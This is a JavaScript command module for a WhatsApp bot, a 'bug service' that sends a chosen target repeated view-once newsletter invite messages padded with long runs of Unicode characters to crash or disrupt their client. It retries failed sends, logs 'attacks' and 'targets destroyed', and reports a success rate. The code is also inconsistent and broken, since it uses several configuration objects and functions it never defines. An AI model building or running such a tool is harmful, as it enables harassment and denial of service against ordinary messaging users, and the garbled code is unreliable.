import pkg from 'bailey';
import os from 'os';

const { proto, generateWAMessageFromContent } = pkg;

import channelSender from '../utils/sender.js';

// Enhanced bug sending configuration
const BUG_CONFIG = {
    MAX_ITERATIONS: 5,           // Reduced to safer value
    DELAY_BETWEEN_REQUESTS: 500, // Increased delay for stability
    WORKER_COUNT: Math.min(os.cpus().length, 4), // Limited to max 4 workers
    RETRY_ATTEMPTS: 3,
    TIMEOUT: 15000,
    
    // Enhanced bug message patterns
    // Using functions to generate payloads on-demand for memory efficiency
    BUG_PATTERNS: [
        () => "⚡".repeat(512),
        () => "\u200e".repeat(512),
        () => "᭫".repeat(256),
        () => "꧁".repeat(256),
        () => "꧂".repeat(256),
        () => "㊊".repeat(256),
        () => "ೈ".repeat(256),
        () => "❁".repeat(256)
    ],
    
    MESSAGE_CONFIG: {
        jid: "120363422552152940@newsletter",
        baseName: "⚡ MICKKING-BOT ⚡",
        caption: "💫 Bug Message Service 💫",
        expiration: 86400000  // 24 hours
    }
};

// Cache de guerre pour performances maximales
class MessageCache {
    constructor() {
        this.messageCache = new Map();
        this.preGenerated = new Map();
    }
    
    generateBugMessage(remoteJid, bugType) {
        const cacheKey = `${remoteJid}_${bugType}`;
        
        if (!this.messageCache.has(cacheKey)) {
            // Use lazy loading for patterns to save memory
            const pattern = BUG_CONFIG.BUG_PATTERNS[bugType];
            const bugString = (typeof pattern === 'function') ? pattern() : pattern;
            const newsletterName = BUG_CONFIG.MESSAGE_CONFIG.baseName + bugString;
            
            const message = generateWAMessageFromContent(
                remoteJid, 
                proto.Message.fromObject({
                    'viewOnceMessage': {
                        'message': {
                            "newsletterAdminInviteMessage": {
                                "newsletterJid": APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.jid,
                                "newsletterName": newsletterName,
                                "jpegThumbnail": ``,
                                "caption": APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.caption,
                                "inviteExpiration": Date.now() + APOCALYPSE_CONFIG.NEWSLETTER_CONFIG.expiration
                            }
                        }
                    }
                }), 
                { 'userJid': remoteJid }
            );
            
            this.messageCache.set(cacheKey, message);
        }
        
        return this.messageCache.get(cacheKey);
    }
    
    clearCache() {
        this.messageCache.clear();
    }
}


// Système de tracking de destruction
class ApocalypseTracker {
    constructor() {
        this.stats = {
            attacksLaunched: 0,
            successfulHits: 0,
            failedAttacks: 0,
            startTime: Date.now(),
            targetsDestroyed: new Set()
        };
    }
    
    recordAttack(target, success = true) {
        this.stats.attacksLaunched++;
        this.stats.targetsDestroyed.add(target);
        if (success) this.stats.successfulHits++;
        else this.stats.failedAttacks++;
    }
    
    getDestructionReport() {
        const elapsed = (Date.now() - this.stats.startTime) / 1000;
        return {
            totalAttacks: this.stats.attacksLaunched,
            successful: this.stats.successfulHits,
            failed: this.stats.failedAttacks,
            targets: this.stats.targetsDestroyed.size,
            attacksPerSecond: this.stats.attacksLaunched / elapsed,
            successRate: (this.stats.successfulHits / this.stats.attacksLaunched) * 100
        };
    }
}

const apocalypseTracker = new ApocalypseTracker();

// Fonction d'attaque nucléaire
async function nuclearStrike(client, participant, strikeType, attempt = 1) {
    try {
        const messageContent = warCache.generateWarMessage(participant, strikeType);
        
        const strikePromise = client.relayMessage(participant, messageContent.message, {
            'participant': { 'jid': participant },
            'messageId': messageContent.key.id
        });
        
        // Timeout pour éviter les blocages
        await Promise.race([
            strikePromise,
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Nuclear strike timeout')), APOCALYPSE_CONFIG.TIMEOUT)
            )
        ]);
        
        apocalypseTracker.recordAttack(participant, true);
        return true;
    } catch (error) {
        console.error("=========================\n Nuclear strike failed (attempt " + attempt + "):\n=========================", error);
        apocalypseTracker.recordAttack(participant, false);
        
        // Re-tentative automatique
        if (attempt < APOCALYPSE_CONFIG.RETRY_ATTEMPTS) {
            await new Promise(resolve => setTimeout(resolve, attempt * 200));
            return nuclearStrike(client, participant, strikeType, attempt + 1);
        }
        
        return false;
    }
}

// Attaque de masse coordonnée
async function massDestruction(message, client, participant) {
    const destructionPromises = [];
    
    for (let i = 0; i < APOCALYPSE_CONFIG.MAX_ITERATIONS; i++) {
        // Utilisation de tous les types de destruction disponibles
        const strikeType = i % APOCALYPSE_CONFIG.DESTRUCTION_STRINGS.length;
        
        destructionPromises.push(
            new Promise(resolve => {
                setTimeout(async () => {
                    const result = await nuclearStrike(client, participant, strikeType);
                    resolve(result);
                }, i * APOCALYPSE_CONFIG.DELAY_BETWEEN_REQUESTS);
            })
        );
        
        // Envoi par vagues pour maximiser l'impact
        if (i % 8 === 0) {
            await Promise.allSettled(destructionPromises);
            destructionPromises.length = 0;
        }
    }
    
    // Finalisation des dernières attaques
    await Promise.allSettled(destructionPromises);
}

// Fonction principale de destruction
export async function apocalypseCrash(message, client) {
    try {
        const remoteJid = message.key?.remoteJid;
        const user = message.pushName || "Unknown Soldier";

        if (!remoteJid) {
            throw new Error("Target coordinates unavailable.");
        }

        // Message d'activation de l'apocalypse
        await client.sendMessage(remoteJid, { 
            text: `=================================
        KURONA CRASH ACTIVATED
=================================
   DESTRUCTION POWER: 300%          
=================================
• Operator: ${user}
• Time: ${new Date().toLocaleString()}
• Status: INITIATING TOTAL ANNIHILATION...
=================================`
        });

        // Identification de la cible
        const messageBody = message.message?.extendedTextMessage?.text || 
                           message.message?.conversation || '';

        const args = messageBody.slice(1).trim().split(/\s+/);
        const targetArgs = args.slice(1);

        let participant;
        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
            participant = message.message.extendedTextMessage.contextInfo.participant;
        } else if (targetArgs.length > 0) {
            participant = targetArgs[0].replace('@', '') + '@s.whatsapp.net';
        } else {
            throw new Error('TARGET REQUIRED FOR APOCALYPSE MODE.');
        }

        // Send status message
        await client.sendMessage(message.key.remoteJid, { 
            text: "⚡ *Bug Sending Process Started*\n_Please wait..._" 
        });

        // Execute bug sending
        await massDestruction(message, client, participant);

        // Get execution report
        const report = apocalypseTracker.getDestructionReport();
        
        const resultMessage = `━━━━『 *Bug Report* 』━━━━

*🎯 Target:* ${participant}
*📊 Statistics:*
 ⌑ Total: ${report.totalAttacks}
 ⌑ Success: ${report.successful}
 ⌑ Failed: ${report.failed}
 ⌑ Rate: ${report.successRate.toFixed(1)}%
 ⌑ Speed: ${report.attacksPerSecond.toFixed(1)}/s

*📈 Status:* ${report.successRate > 85 ? '✅ Successfully Delivered' : 
              report.successRate > 60 ? '⚠️ Partially Delivered' : 
              '❌ Delivery Issues'}

━━『 *MICKKING BUG SERVICE* 』━━`;

        await channelSender(message, client, victoryMessage, 1);

    } catch (error) {
        console.error("Bug sending error:", error);
        
        const errorMessage = `━━━━『 *Error Report* 』━━━━

❌ *Bug Sending Failed*
⚠️ *Error:* ${error.message}
⏰ *Time:* ${new Date().toLocaleTimeString()}

_Try again in a few minutes..._

━━『 *MICKKING BUG SERVICE* 』━━`;

        if (message.key.remoteJid) {
            try {
                await client.sendMessage(message.key.remoteJid, { 
                    text: errorMessage,
                    contextInfo: {
                        externalAdReply: {
                            title: "Bug Service",
                            body: "Error Notification",
                            showAdAttribution: true
                        }
                    }
                });
            } catch (sendError) {
                console.error("Failed to send error message:", sendError);
            }
        }
    }
}

// Note: Removed automatic cluster forking to avoid child processes starting on module import.
// Commands should not fork worker processes on import — if you need parallel workers,
// start them explicitly from the main process (e.g., index.js) with proper lifecycle handling.

export default apocalypseCrash